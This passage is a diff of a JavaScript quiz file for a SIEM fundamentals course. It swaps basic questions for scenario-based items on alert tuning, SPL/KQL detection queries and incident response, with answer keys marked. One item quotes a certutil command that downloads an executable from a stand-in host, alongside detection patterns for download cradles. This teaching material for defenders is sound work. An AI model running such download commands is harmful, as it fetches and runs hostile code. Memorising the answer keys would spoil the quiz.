+          "Risk-Based Alerting (RBA): aggregates many low/medium signals into entity risk scores, paging only when accumulated risk crosses a threshold. Dramatically reduces page volume AND surfaces multi-step attacks that no single rule would have caught.",
+          "The same as throttling.",
+          "Splunk-only."
         ],
         correctAnswer: 1,
-        explanation: "Reducing false positives requires ongoing tuning: adding whitelists, adjusting thresholds, enriching with context, and reviewing performance metrics."
+        explanation: "RBA is the modern shift from 'rule fires → page' to 'evidence accumulates on an entity → page when risky.' Catches slow, distributed attack chains; reduces analyst burnout. Implemented natively in Splunk ES RBA, Sentinel Fusion, custom in any SIEM."
       },
       {
         id: "siem-q4-9",
-        question: "What is a 'heatmap' useful for in security dashboards?",
+        difficulty: "medium",
+        tags: ["FP Pattern"],
+        scenario: "Your 'Mass File Access' rule fires every Monday morning on 'svc-backup'. Always benign.",
+        question: "Correct fix?",
         options: [
-          "Monitoring server room temperature",
-          "Visualizing data density or activity patterns across two dimensions",
-          "Heating up cold storage data",
-          "Showing network cable layouts"
+          "Suppress all Monday alerts.",
+          "Add a specific exception for the svc-backup account scoped to its known backup window AND only when accessing the backup target paths. Narrow exceptions, not blanket ones.",
+          "Disable the rule on Mondays.",
+          "Page anyway."
         ],
         correctAnswer: 1,
-        explanation: "Heatmaps visualize data density across two dimensions using color intensity, ideal for spotting anomalous activity patterns."
+        explanation: "Narrow exceptions (account + path + time window) preserve detection if svc-backup is compromised and used outside its known pattern. Blanket time-based suppression is what attackers exploit."
       },
       {
         id: "siem-q4-10",
-        question: "What should a well-designed alert include?",
+        difficulty: "medium",
+        tags: ["Detection KPI"],
+        scenario: "You're asked for the single best metric to track detection quality over time.",
+        question: "Which?",
         options: [
-          "Just the alert name",
-          "Severity, description, affected assets, recommended response actions, and relevant context",
-          "Only the raw log data",
-          "The analyst's personal notes"
+          "Total alerts/day.",
+          "Alert fidelity = TP / (TP + FP), tracked per rule and overall, alongside MTTD/MTTR. Rising fidelity = tuning is working; falling fidelity = ingest or environment changed and rules need attention.",
+          "Number of rules.",
+          "SIEM CPU usage."
         ],
         correctAnswer: 1,
-        explanation: "Effective alerts include severity level, clear description, affected assets, recommended investigation steps, and contextual information."
-      },
-      {
-        id: "siem-q4-11",
-        question: "What is a 'scheduled search' in SIEM alerting?",
-        options: [
-          "A search saved for personal reference",
-          "A search that runs automatically at defined intervals and triggers alerts when conditions are met",
-          "A search scheduled for deletion",
-          "A manual search run by an analyst"
-        ],
-        correctAnswer: 1,
-        explanation: "Scheduled searches run automatically at configured intervals, evaluating results against conditions to generate alerts."
-      },
-      {
-        id: "siem-q4-12",
-        question: "What is alert throttling?",
-        options: [
-          "Speeding up alert delivery",
-          "Limiting how frequently the same alert can fire within a time window to prevent flooding",
-          "Increasing alert severity",
-          "Disabling alerts permanently"
-        ],
-        correctAnswer: 1,
-        explanation: "Alert throttling prevents alert flooding by suppressing duplicate alerts within a defined time window."
-      },
-      {
-        id: "siem-q4-13",
-        question: "When should you use a geographic map visualization?",
-        options: [
-          "For all types of data",
-          "When displaying data with geographic context like source IPs or login locations",
-          "Only for internal network traffic",
-          "When showing CPU usage"
-        ],
-        correctAnswer: 1,
-        explanation: "Geographic maps are ideal for displaying location-based data such as attack origins or VPN login locations."
-      },
-      {
-        id: "siem-q4-14",
-        question: "What is a 'notable event' in Splunk Enterprise Security?",
-        options: [
-          "Any regular log event",
-          "A high-priority security event generated by correlation searches that requires investigation",
-          "A deleted event",
-          "A scheduled report"
-        ],
-        correctAnswer: 1,
-        explanation: "Notable events are security-significant events generated by correlation searches in Splunk ES, appearing in the incident review queue."
-      },
-      {
-        id: "siem-q4-15",
-        question: "What is the best practice for dashboard refresh intervals?",
-        options: [
-          "Refresh every second for real-time data",
-          "Balance between timely data and system performance — typically 1-5 minutes for operational dashboards",
-          "Never refresh — use static snapshots only",
-          "Refresh only when manually triggered"
-        ],
-        correctAnswer: 1,
-        explanation: "Dashboard refresh intervals should balance timeliness with performance. Operational SOC dashboards typically refresh every 1-5 minutes."
+        explanation: "Fidelity is the rule-level proxy for detection quality. Track per-rule (kill or tune the worst offenders), and globally (cross-team KPI). MTTD/MTTR complete the picture by measuring whether the alerts that DO fire are acted on quickly."
       }
     ]
   },
   {
     quizId: "siem-q5",
     courseId: "siem-fundamentals",
-    title: "Final Certification Exam",
-    description: "Comprehensive exam covering all SIEM fundamentals modules. Required for certification.",
+    title: "SIEM Fundamentals — Final Exam",
+    description: "Comprehensive scenario-based exam covering architecture, onboarding, query, detection, and operations.",
     passingScore: 80,
     timeLimit: 45,
     questions: [
       {
         id: "siem-q5-1",
-        question: "A SOC analyst notices 500 failed login attempts from a single IP within 10 minutes. What SIEM feature detected this?",
+        difficulty: "medium",
+        tags: ["Triage", "Brute Force"],
+        scenario: "07:42 — Alert fires: 500 failed logons against acct 'admin' from 1 source IP in 10 minutes, followed by 1 SUCCESS from the same IP for the same account. The src_ip is external.",
+        question: "First action?",
         options: [
-          "Dashboard visualization",
-          "Correlation rule with threshold-based detection",
-          "Data normalization",
-          "Log retention policy"
+          "Wait for more evidence.",
+          "Treat as confirmed credential compromise: contain (disable account / force-reauth), pivot to find every session/host the account touched after the success event, preserve evidence, open IR ticket.",
+          "Reset the password and close.",
+          "Block the IP and close."
         ],
         correctAnswer: 1,
-        explanation: "Threshold-based correlation rules detect when event counts exceed defined limits within a time window."
+        explanation: "Brute-force followed by success = the attacker is in. Password reset alone doesn't kill active sessions. Containment + scope (where else has this account authenticated since the success?) + IR is the correct sequence."
       },
       {
         id: "siem-q5-2",
-        question: "Which SPL query would find the top 10 source IPs generating failed authentication events?",
+        difficulty: "hard",
+        tags: ["SPL"],
+        scenario: "Write SPL for: top 10 external src_ips by count of distinct internal users they attempted to authenticate as (failed) in the last 24h.",
+        question: "Best query:",
         options: [
-          "search failed auth | head 10",
-          "index=security action=failure | stats count by src_ip | sort -count | head 10",
-          "index=security | delete failed | top 10",
-          "search * | filter src_ip"
+          "index=auth action=failure src_ip=10.* | top 10",
+          "index=auth action=failure earliest=-24h NOT src_ip IN (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) | stats dc(user) AS unique_users by src_ip | sort -unique_users | head 10",
+          "index=* failed | head 10",
+          "index=auth | stats count by user"
         ],
         correctAnswer: 1,
-        explanation: "This query searches security events for failures, counts per source IP, sorts descending, and limits to the top 10."
+        explanation: "Filter to failures, exclude RFC1918 (external only), distinct-count of users per IP (password-spray fingerprint), sort + head. Password spray attackers hit MANY accounts ONCE each — dc(user), not count, surfaces them."
       },
       {
         id: "siem-q5-3",
-        question: "What is the MITRE ATT&CK tactic that SIEM is most directly aligned to detect?",
+        difficulty: "medium",
+        tags: ["KQL", "Impossible Travel"],
+        scenario: "Sentinel alert: 'Impossible travel' — user signed in from Mumbai 14:02 IST, then São Paulo 14:31 IST.",
+        question: "Before paging IR, what do you check first?",
         options: [
-          "Resource Development",
-          "Reconnaissance",
-          "Multiple tactics across the kill chain via log correlation",
-          "Physical access attacks"
+          "Disable the user.",
+          "Check (1) is the second sign-in from a known corporate VPN/proxy egress? (2) is it the SAME UserAgent / device-id? (3) any preceding successful MFA? (4) Conditional Access risk score? Only escalate if context still looks anomalous.",
+          "Ignore — probably VPN.",
+          "Reset their password without notice."
         ],
-        correctAnswer: 2,
-        explanation: "SIEM can detect activities across multiple ATT&CK tactics by correlating logs from various sources."
+        correctAnswer: 1,
+        explanation: "Impossible-travel has a high benign-rate (VPNs, mobile carriers, satellite). Enriching with VPN/proxy/device/MFA context is mandatory triage. Both (A) blind containment and (C) blind dismissal are wrong."
       },
       {
         id: "siem-q5-4",
-        question: "An analyst sees an 'Impossible Travel' alert — login from New York, then London 30 minutes later. What should they do first?",
+        difficulty: "medium",
+        tags: ["Exfiltration"],
+        scenario: "Possible data exfiltration suspected for user 'jdoe'. Which combination of SIEM data sources gives the strongest case?",
+        question: "Best set:",
         options: [
-          "Immediately disable the user account",
-          "Ignore it — it's probably a VPN",
-          "Investigate by checking VPN/proxy usage, verifying with the user, and reviewing session details",
-          "Delete the alert"
+          "Email only.",
+          "Proxy/firewall outbound flows (volume + destination), DLP alerts, EDR file-access + USB events, CASB (sanctioned SaaS uploads), DNS — correlated by user/host over the suspected window.",
+          "Just CloudTrail.",
+          "Just authentication logs."
         ],
-        correctAnswer: 2,
-        explanation: "The analyst should investigate before acting: check for VPN/proxy usage, contact the user, and review session details."
+        correctAnswer: 1,
+        explanation: "Exfil paths are diverse — corporate email, personal webmail, sanctioned SaaS, unsanctioned SaaS, USB, DNS tunneling, cloud sync. A defensible case correlates network + endpoint + identity + DLP. Single-source theories are easy to refute."
       },
       {
         id: "siem-q5-5",
-        question: "What is the difference between real-time and historical SIEM searches?",
+        difficulty: "hard",
+        tags: ["IR Timeline"],
+        scenario: "You're rebuilding an incident timeline. Events come from EDR, firewall, proxy, AD, and Okta — all with different timestamp formats and some in local TZ.",
+        question: "Critical prep step?",
         options: [
-          "There is no difference",
-          "Real-time searches continuously monitor incoming events; historical searches query stored data",
-          "Historical searches are always faster",
-          "Real-time searches only work on dashboards"
+          "Sort by ingest_time and call it good.",
+          "Normalize ALL timestamps to UTC at event_time before merging the timeline. Always cite event_time, not ingest_time. Verify NTP sync on contributing hosts; flag any clock-drift > 60s.",
+          "Convert everything to IST.",
+          "Ignore timestamps."
         ],
         correctAnswer: 1,
-        explanation: "Real-time searches monitor events as they arrive; historical searches query already-indexed data for investigation."
+        explanation: "Timeline integrity stands on consistent event-time in UTC. Mixed TZ + clock drift = misleading attack narrative. ingest_time tells you when the SIEM received it (subject to lag); event_time tells you when it happened."
       },
       {
         id: "siem-q5-6",
-        question: "Which KQL query finds sign-in events from outside the United States in the last 24 hours?",
+        difficulty: "medium",
+        tags: ["Notable Event", "Splunk ES"],
+        scenario: "In Splunk ES, a correlation search produces a notable event. The analyst clicks it in Incident Review.",
+        question: "What is the notable event?",
         options: [
-          "SigninLogs | where Location != 'US'",
-          "SigninLogs | where TimeGenerated > ago(24h) | where LocationDetails.countryOrRegion != 'US'",
-          "search SigninLogs NOT US",
-          "SigninLogs | summarize by Location"
+          "A raw log line.",
+          "A higher-order security event derived from one or more raw events by a correlation search, with status (New/In Progress/Closed), severity, owner, and adaptive-response actions attached. It's the unit of SOC work.",
+          "A dashboard panel.",
+          "A scheduled report."
         ],
         correctAnswer: 1,
-        explanation: "This KQL query filters SigninLogs to the last 24 hours and excludes US-based sign-ins."
+        explanation: "Notables in ES (and 'Incidents' in Sentinel, 'Offenses' in QRadar) are first-class objects representing actionable security events. They're the surface the SOC works against — not the raw log."
       },
       {
         id: "siem-q5-7",
-        question: "What is 'lateral movement' and how can SIEM detect it?",
+        difficulty: "easy",
+        tags: ["Retention"],
+        scenario: "Compliance says 'keep audit logs 1 year.' Your hot tier holds 30 days, warm 90 days, cold 365.",
+        question: "Are you compliant?",
         options: [
-          "Physical movement of servers; detected by cameras",
-          "Attackers moving between systems; detected by correlating authentication logs across hosts",
-          "Network cable rearrangement; detected by port monitoring",
-          "Staff relocations; detected by HR systems"
+          "No.",
+          "Yes — the total retention envelope (30 + 90 + 365 days, with cold-tier search/restore capability) satisfies the 1-year requirement, provided the data is searchable on demand by auditors / IR.",
+          "Only if everything is hot.",
+          "Need 7 years."
         ],
         correctAnswer: 1,
-        explanation: "Lateral movement is when attackers move between internal systems. SIEM detects it by correlating authentication events across hosts."
+        explanation: "Compliance cares about retention duration + retrievability, not which tier. The defensible architecture: tier by access pattern; document SLAs for cold-tier restore. Auditors accept tiered storage."
       },
       {
         id: "siem-q5-8",
-        question: "You need a dashboard showing daily login trends, top failed IPs, and geographic distribution. Which visualizations?",
+        difficulty: "hard",
+        tags: ["Detection Engineering"],
+        scenario: "A new threat blog drops: 'Adversary uses certutil.exe -urlcache -split -f http://x/y.exe to download payloads.' You need a detection by EOD.",
+        question: "Smallest, highest-fidelity SPL?",
         options: [
-          "Three pie charts",
-          "Line chart for trends, bar chart for top IPs, geographic map for distribution",
-          "Three tables",
-          "Three single-value panels"
+          "index=* certutil",
+          "index=endpoint sourcetype=Sysmon EventID=1 process_name=certutil.exe (commandline=*-urlcache* OR commandline=*-split*) commandline=*http* — narrow on the LOLBin + the abusive flags + URL fetch pattern",
+          "index=network http",
+          "index=* | head 1000"
         ],
         correctAnswer: 1,
-        explanation: "Use each visualization for its strength: line charts for trends, bar charts for rankings, and maps for geographic data."
+        explanation: "Detection precision = narrow on the abused capability (LOLBin) + the suspicious flag combination + the network artefact. 'certutil' alone (A) is noisy admin tooling; the flag combo is the attacker tell. Pair with allow-list for legit admins."
       },
       {
         id: "siem-q5-9",
-        question: "What is the purpose of a SIEM use case library?",
+        difficulty: "medium",
+        tags: ["Threat Intel"],
+        scenario: "You ingest a commercial threat-intel feed of 'malicious IPs'. After a week, your alerts are flooded with hits on those IPs visiting your public website.",
+        question: "Why and fix?",
         options: [
-          "A collection of books about SIEM",
-          "A documented catalog of detection rules mapped to threats, with queries and response procedures",
-          "A list of SIEM vendors",
-          "A software code repository"
+          "TI feeds are useless.",
+          "Inbound TI matches on a public-facing service are mostly internet noise (opportunistic scanners). Restrict TI matching to (a) OUTBOUND traffic from internal hosts, or (b) INBOUND only on non-public assets. Adds the context the feed lacks.",
+          "Buy a bigger feed.",
+          "Block every TI IP at the perimeter."
         ],
         correctAnswer: 1,
-        explanation: "A use case library catalogs all detection rules with their purpose, associated threats, queries, and response procedures."
+        explanation: "TI value depends on DIRECTION and ASSET. Outbound to a known-bad IP from an internal endpoint is high-signal (possible C2). Inbound from the same IP to your public web is the entire internet's daily noise. Scope alerts accordingly."
       },
       {
         id: "siem-q5-10",
-        question: "What does 'data onboarding' involve in a SIEM project?",
+        difficulty: "medium",
+        tags: ["SOAR"],
+        scenario: "Your SIEM integrates with SOAR. A phishing-URL alert fires.",
+        question: "Smart automation?",
         options: [
-          "Training new employees",
-          "Identifying, collecting, normalizing, and validating new data sources for ingestion",
-          "Purchasing new hardware",
-          "Uninstalling old software"
+          "Auto-delete the user's mailbox.",
+          "Auto-enrichment + safe containment: detonate URL in sandbox, pull URL reputation, search Exchange for other recipients, propose (analyst-approved) bulk remediation. Reversible actions automate; irreversible actions stay analyst-gated.",
+          "Page the CEO.",
+          "Auto-disable the recipient's account."
         ],
         correctAnswer: 1,
-        explanation: "Data onboarding integrates new log sources: identifying data, configuring collection, defining parsing, and validating quality."
+        explanation: "SOAR maturity rule of thumb: automate REVERSIBLE actions (enrichment, sandbox, search), keep IRREVERSIBLE ones (account disable, host isolation in some orgs) human-approved with one-click approval. Builds analyst trust, prevents catastrophic auto-actions."
       },
       {
         id: "siem-q5-11",
-        question: "An alert fires for 'PowerShell Download Cradle Detected'. What SPL query likely generated this?",
+        difficulty: "hard",
+        tags: ["Lateral Movement"],
+        scenario: "EDR shows a user account 'jdoe' authenticating to 27 distinct hosts in 12 minutes from a single workstation. jdoe is a helpdesk technician (so some breadth is normal).",
+        question: "Best discriminator between 'normal' and 'compromised'?",
         options: [
-          "index=security powershell",
-          "index=endpoint process_name=powershell.exe (commandline=*downloadstring* OR commandline=*invoke-webrequest*)",
-          "search powershell download",
-          "index=network http download"
+          "Total host count alone — 27 is high, page.",
+          "Compare to jdoe's OWN 30-day baseline (median distinct hosts/12min) AND to the helpdesk-cohort baseline. A user 5x above their personal AND cohort baseline is anomalous; a user matching their normal pattern is not.",
+          "It's always benign for helpdesk.",
+          "It's always malicious."
         ],
         correctAnswer: 1,
-        explanation: "This query searches endpoint logs for PowerShell processes with download-related command-line arguments."
+        explanation: "Per-entity + per-cohort baselines beat global thresholds for role-variable behavior. Helpdesk normal ≠ accountant normal. UEBA is exactly this discipline — relative anomaly detection rather than fixed thresholds."
       },
       {
         id: "siem-q5-12",
-        question: "What is the 'kill chain' approach to SIEM detection?",
+        difficulty: "medium",
+        tags: ["Health"],
+        scenario: "Friday 22:00: the 'Critical Brute Force' detection has not fired in 5 days, but historically fired daily. SOC manager is pleased.",
+        question: "Correct response?",
         options: [
-          "A method to delete old alerts",
-          "Creating detection rules aligned to each stage of an attack lifecycle",
-          "A chain of SIEM servers",
-          "Removing unused detection rules"
+          "Send a 'detection working great!' email.",
+          "Open a P2 'detection health' ticket. Verify (1) source ingestion volume vs baseline, (2) parser/field health for required fields, (3) any recent rule/parser/policy change. Sudden silence is a blind-spot warning.",
+          "Disable the rule.",
+          "Lower the threshold."
         ],
         correctAnswer: 1,
-        explanation: "The kill chain approach creates layered detection rules at each attack stage, increasing the chance of catching attackers."
+        explanation: "Anomalous quiet on historically active detections is one of the most-missed indicators of broken pipelines. Treat silence as a signal worth investigating, especially before weekends/holidays."
       },
       {
         id: "siem-q5-13",
-        question: "How should you handle a detection rule with a 90% false positive rate?",
+        difficulty: "medium",
+        tags: ["RBAC", "SIEM Admin"],
+        scenario: "A Tier 1 analyst asks for permission to delete events from the index 'to clean up false positives'.",
+        question: "Correct response?",
         options: [
-          "Keep it — 10% true positive is acceptable",
-          "Delete the rule entirely",
-          "Analyze false positives for patterns, refine the rule logic, add exceptions, and retest",
-          "Lower the severity and ignore it"
+          "Grant it — efficiency matters.",
+          "Refuse. SIEM data is forensic evidence; deletion breaks audit/IR. The right tool is TUNING (suppressions, exceptions) so the events still exist but don't generate alerts. SIEM admin / delete rights stay tightly held and audited.",
+          "Grant temporarily.",
+          "Grant for one index."
         ],
-        correctAnswer: 2,
-        explanation: "Identify common FP patterns, refine query logic, add contextual conditions or exceptions, then retest to improve fidelity."
+        correctAnswer: 1,
+        explanation: "Once events are gone, they're gone — including the ones an IR team needs in 6 months. Suppression (no alert) is reversible; deletion is not. SIEM admin is a privileged role on par with domain admin and should be treated as such."
       },
       {
         id: "siem-q5-14",
-        question: "What is 'pivoting' in SIEM investigation?",
+        difficulty: "hard",
+        tags: ["Insider Threat"],
+        scenario: "A finance user starts accessing source-control repos and S3 buckets they've never touched in 18 months — at 02:00 local time — 2 weeks before their resignation date (known to HR).",
+        question: "What SIEM capability turns this into a usable signal?",
         options: [
-          "Rotating dashboard panels",
-          "Using a discovered indicator to search for related events and expand the investigation",
-          "Switching between SIEM platforms",
-          "Changing the search time range"
+          "A keyword alert on the word 'leaving'.",
+          "UEBA / risk-scoring: HR feed marks the user as 'leaver', behavioral baselines flag the access deviation, off-hours adds risk, accumulated risk crosses threshold → investigation. Single events are weak; the score is the signal.",
+          "Disable all leavers immediately.",
+          "Don't monitor finance users."
         ],
         correctAnswer: 1,
-        explanation: "Pivoting uses discovered artifacts as new search terms to find related events and uncover the full attack scope."
+        explanation: "Insider risk lives in correlation: HR context + behavioral baseline + time + asset sensitivity. UEBA + risk-based alerting are designed for this. Reactive 'disable on resignation' (C) is necessary but insufficient — exfil often happens BEFORE notice."
       },
       {
         id: "siem-q5-15",
-        question: "What is the recommended approach for building a new detection rule?",
+        difficulty: "medium",
+        tags: ["Cloud", "CloudTrail"],
+        scenario: "CloudTrail event: a former contractor's API access key calls iam:CreateUser at 03:14 UTC. The contractor offboarded last week.",
+        question: "Severity and first action?",
         options: [
-          "Write it and immediately put it in production",
-          "Copy rules from the internet without modification",
-          "Develop, test against historical data, tune to reduce false positives, then deploy with monitoring",
-          "Only use vendor-provided rules"
+          "Low — probably automation.",
+          "Critical. Confirmed credential abuse + privilege escalation attempt by an account that should not exist. Immediately disable the access key, list every action that key has taken in the last 30 days, snapshot affected resources, open IR.",
+          "Email the contractor.",
+          "Wait for more activity."
         ],
-        correctAnswer: 2,
-        explanation: "Best practice: develop, test against historical data, tune thresholds/exceptions, then deploy with ongoing monitoring."
+        correctAnswer: 1,
+        explanation: "Offboarded creds + privileged API call = active compromise. Containment first (disable key), scope second (full CloudTrail audit of the key), evidence preserved, IR engaged. Time-to-contain on cloud key abuse is everything — keys can spin up money-printing instances in minutes."
       },
       {
         id: "siem-q5-16",
-        question: "What is the difference between a 'saved search' and an 'alert' in SIEM?",
+        difficulty: "easy",
+        tags: ["Sigma"],
+        scenario: "A team-mate writes a new detection directly in Splunk SPL. Another writes the same logic in KQL for Sentinel. Both maintain their copies.",
+        question: "What process improvement should you propose?",
         options: [
-          "They are the same thing",
-          "A saved search is a reusable query; an alert is a saved search that triggers notifications",
-          "Saved searches are faster",
-          "Alerts cannot be saved"
+          "Standardize on Splunk only.",
+          "Author detections in Sigma (vendor-neutral) as source-of-truth in Git; compile to SPL and KQL via sigmac/pySigma. One source, two backends, no drift.",
+          "Standardize on KQL only.",
+          "Keep doing both manually."
         ],
         correctAnswer: 1,
-        explanation: "A saved search is a stored query. An alert builds on a saved search by adding trigger conditions and notification actions."
+        explanation: "Sigma-first detection-as-code is the modern multi-SIEM standard. The detection LOGIC lives once in Git; the per-vendor SYNTAX is generated. Eliminates the inevitable drift between hand-maintained copies."
       },
       {
         id: "siem-q5-17",
-        question: "During an incident, what is the best SIEM approach to build a timeline?",
+        difficulty: "hard",
+        tags: ["Maturity"],
+        scenario: "Two SOCs:\n  SOC A: 10 TB/day ingest, 1,200 vendor-default rules, no MITRE mapping, no tuning cadence, 4,000 alerts/day.\n  SOC B: 2 TB/day ingest, 280 custom + Sigma-managed rules, mapped to ATT&CK with a quarterly gap review, 60 alerts/day, RBA-paged.\nWhich is more mature?",
+        question: "Answer:",
         options: [
-          "Screenshot each alert individually",
-          "Use transaction grouping and time-sorted searches across relevant data sources",
-          "Only check the last hour of logs",
-          "Ask colleagues to remember what happened"
+          "A — bigger ingest = better.",
+          "B — focused data, intentional detections aligned to threats, measured coverage, sustainable alert volume. Maturity is OUTCOMES (catch rate, MTTD, MTTR, analyst sustainability), not ingest size.",
+          "Equally mature.",
+          "Neither."
         ],
         correctAnswer: 1,
-        explanation: "Building timelines requires time-sorted, correlated searches across multiple data sources to reconstruct the complete event sequence."
+        explanation: "Volume is the most-misused SIEM metric. Mature SOCs measure detection coverage and outcomes; immature SOCs measure 'how much data we have.' SOC A is the textbook 'expensive log archive masquerading as a SIEM.'"
       },
       {
         id: "siem-q5-18",
-        question: "What metric measures the percentage of alerts that are actual security incidents?",
+        difficulty: "medium",
+        tags: ["Investigation"],
+        scenario: "You start with a single indicator — a suspicious external domain. You want every related event across all data sources.",
+        question: "Tradecraft term for this and the SIEM workflow?",
         options: [
-          "EPS (Events Per Second)",
-          "True Positive Rate / Alert Fidelity",
-          "MTTR (Mean Time To Respond)",
-          "Data Ingestion Volume"
+          "Throttling.",
+          "Pivoting: take the indicator (domain), search across DNS, proxy, firewall, EDR for ANY event referencing it; surface internal hosts that touched it; pivot again from those hosts to their other activity. Each pivot expands scope until the full intrusion picture forms.",
+          "Throttling.",
+          "Suppression."
         ],
         correctAnswer: 1,
-        explanation: "True Positive Rate measures the percentage of alerts that represent real security incidents."
+        explanation: "Pivoting is the core investigation primitive — turn each newly discovered artefact into a new search until the intrusion graph is complete. Good SIEMs make pivots one-click; great analysts know what to pivot ON next."
       },
       {
         id: "siem-q5-19",
-        question: "What is the role of threat intelligence feeds in SIEM?",
+        difficulty: "hard",
+        tags: ["Anti-Forensics", "1102"],
+        scenario: "Windows Security Event ID 1102 ('audit log cleared') fires on a domain controller at 04:01 UTC. No scheduled maintenance.",
+        question: "Treatment?",
         options: [
-          "They replace the need for correlation rules",
-          "They provide external indicators for automatic matching against incoming events",
-          "They generate dashboards automatically",
-          "They manage user authentication"
+          "Low — admin probably cleared it.",
+          "Treat as active intrusion. 1102 is anti-forensics (MITRE T1070.001) — especially on a DC. Pull the CENTRAL SIEM copy (which the attacker can't reach), identify the logon session/account that issued the clear, isolate the DC, escalate to IR. Time-of-clear is your timeline pivot.",
+          "Ignore.",
+          "Reboot the DC."
         ],
         correctAnswer: 1,
-        explanation: "Threat intelligence feeds supply external IOCs that the SIEM matches against incoming events to detect known threats."
+        explanation: "Audit-log-cleared on a DC by a non-maintenance account is one of the highest-fidelity 'adversary on critical infra' signals. The SIEM has the central copy precisely because we ship logs off-host — pivot from the 1102 to the issuing session (4624 just before)."
       },
       {
         id: "siem-q5-20",
-        question: "You're investigating potential data exfiltration. Which SIEM data sources are most relevant?",
+        difficulty: "medium",
+        tags: ["KQL", "Identity"],
+        scenario: "Sentinel — find users whose sign-in succeeded with MFA SATISFIED but the MFA method was 'Phone call' from a high-risk country in the last 24h (possible MFA-fatigue or SIM-swap pattern).",
+        question: "Sketch the right KQL filter chain:",
         options: [
-          "Only email logs",
-          "Firewall/proxy logs, DLP alerts, endpoint logs, and DNS queries",
-          "Only authentication logs",
-          "Only SIEM configuration logs"
+          "SigninLogs | take 100",
+          "SigninLogs | where TimeGenerated > ago(24h) | where ResultType == 0 | where AuthenticationDetails has 'Phone call' | where LocationDetails.countryOrRegion in ('XX','YY') | project UserPrincipalName, IPAddress, AuthenticationDetails, LocationDetails",
+          "SigninLogs | where MFA == false",
+          "SigninLogs | summarize by AppDisplayName"
         ],
         correctAnswer: 1,
-        explanation: "Data exfiltration investigation requires correlating outbound traffic, DLP alerts, endpoint activity, and DNS queries."
+        explanation: "Compound filter on time + success + MFA method + geography + project the columns IR needs. Phone-call MFA from a sudden new country is a strong SIM-swap signal; the rule should surface enough context for a Tier 2 to action in one screen."
       },
       {
         id: "siem-q5-21",
-        question: "What is a 'detection gap' in SIEM operations?",
+        difficulty: "hard",
+        tags: ["Detection Gap"],
+        scenario: "ATT&CK Navigator overlay shows your detection covers Execution and Defense Evasion well, but Credential Access and Lateral Movement are mostly empty.",
+        question: "What does this tell you, and what's the next action?",
         options: [
-          "A physical gap in the server rack",
-          "A threat scenario that the SIEM currently has no detection rule for",
-          "Time between dashboard refreshes",
-          "Network latency"
+          "Coverage is balanced.",
+          "You'll catch the loud first stages and the noisy evasion but likely MISS the quiet middle of an intrusion — where attackers harvest creds and pivot. Build detections for Credential Access (LSASS access, Kerberoasting, AS-REP, DCSync) and Lateral Movement (anomalous SMB/RDP/WinRM patterns) as priority.",
+          "Delete the existing rules.",
+          "Buy more storage."
         ],
         correctAnswer: 1,
-        explanation: "A detection gap is a threat without detection coverage. Gap analysis against MITRE ATT&CK helps identify and prioritize new rules."
+        explanation: "The middle of the kill chain is where dwell time hides. ATT&CK heatmaps make these gaps visible AND prioritizable. Coverage of Execution + Evasion only is the classic 'we catch initial loud activity then go blind' SOC."
       },
       {
         id: "siem-q5-22",
-        question: "What is the benefit of SIEM integration with SOAR?",
+        difficulty: "medium",
+        tags: ["Detection Rule Design"],
+        scenario: "You propose a new rule. Reviewer checklist asks: 'How will an analyst know if this fires by mistake?'",
+        question: "What must accompany the rule?",
         options: [
-          "SOAR replaces the SIEM entirely",
-          "SOAR automates response actions triggered by SIEM alerts, reducing response time",
-          "SOAR provides better data storage",
-          "SOAR improves SIEM search speed"
+          "Nothing — analysts will figure it out.",
+          "Documented FALSE-POSITIVE patterns (known benign sources, expected triggers) AND a triage runbook: 'If you see X, it's likely benign because Y; verify by checking Z; escalate when ...'. Detection delivery is rule + runbook + FP profile.",
+          "Just the rule logic.",
+          "A meme."
         ],
         correctAnswer: 1,
-        explanation: "SOAR automates repetitive response actions triggered by SIEM alerts, reducing MTTR and freeing analysts for complex investigations."
+        explanation: "Detections without FP profiles + runbooks are guaranteed to become noisy and ignored. Detection engineering's deliverable is a USABLE rule, not a clever query. This is the single biggest cultural lever for SOC quality."
       },
       {
         id: "siem-q5-23",
-        question: "What is 'log source health monitoring' in SIEM?",
+        difficulty: "easy",
+        tags: ["SOC Success"],
+        scenario: "Leadership asks: 'What's the most important factor for SIEM success?'",
+        question: "Best answer:",
         options: [
-          "Monitoring the physical health of servers",
-          "Tracking whether expected log sources are actively sending data and alerting if ingestion stops",
-          "Running antivirus on log files",
-          "Checking log file formatting"
+          "The most expensive platform.",
+          "Skilled analysts/engineers who understand the environment, write and tune detections, run a disciplined detection lifecycle, and continuously close coverage gaps. Tools amplify capability; they do not create it.",
+          "Ingesting maximum data.",
+          "Fully automated, zero humans."
         ],
         correctAnswer: 1,
-        explanation: "Log source health monitoring tracks active ingestion and alerts when data stops flowing — missing logs create detection blind spots."
+        explanation: "Every survey of SOC effectiveness lands here. Vendor capability matters; people + process beat platform every time. A great team on a mid-tier SIEM outperforms an absent team on the best SIEM."
       },
       {
         id: "siem-q5-24",
-        question: "Which represents the most mature SIEM deployment?",
+        difficulty: "hard",
+        tags: ["End-to-End"],
+        scenario: "Putting it all together — an alert fires at 03:14: 'PowerShell EncodedCommand executed from winword.exe child process on FIN-HR-04.' Walk the optimal end-to-end SOC flow.",
+        question: "Best sequence:",
         options: [
-          "Collecting logs from one data source with no alerts",
-          "Collecting from multiple sources with vendor-default rules only",
-          "Comprehensive data sources, customized detection mapped to ATT&CK, automated response, continuous tuning",
-          "Using SIEM only for compliance reporting"
+          "Acknowledge → close.",
+          "Triage (asset = CFO laptop; enrich w/ user, recent emails, EDR process tree) → Contain (isolate host via EDR, force re-auth on user) → Investigate (decode the PS, hunt the parent doc, pivot on any C2 domain across all hosts) → Eradicate (kill persistence, rotate creds, remove artefacts) → Recover (re-image, monitor for re-infection) → Lessons learned (update detection, add IOC to TI, share with peers).",
+          "Page → close.",
+          "Ignore — false positive."
         ],
-        correctAnswer: 2,
-        explanation: "A mature SIEM features comprehensive data coverage, customized detections, SOAR integration, and continuous improvement."
+        correctAnswer: 1,
+        explanation: "This is the SANS-style IR loop (Triage → Contain → Investigate → Eradicate → Recover → Lessons Learned), executed THROUGH the SIEM as the system of record. Every step generates SIEM evidence; lessons-learned closes the loop by improving detections."
       },
       {
         id: "siem-q5-25",
-        question: "What is the most critical factor for SIEM success in a SOC?",
+        difficulty: "medium",
+        tags: ["Culture"],
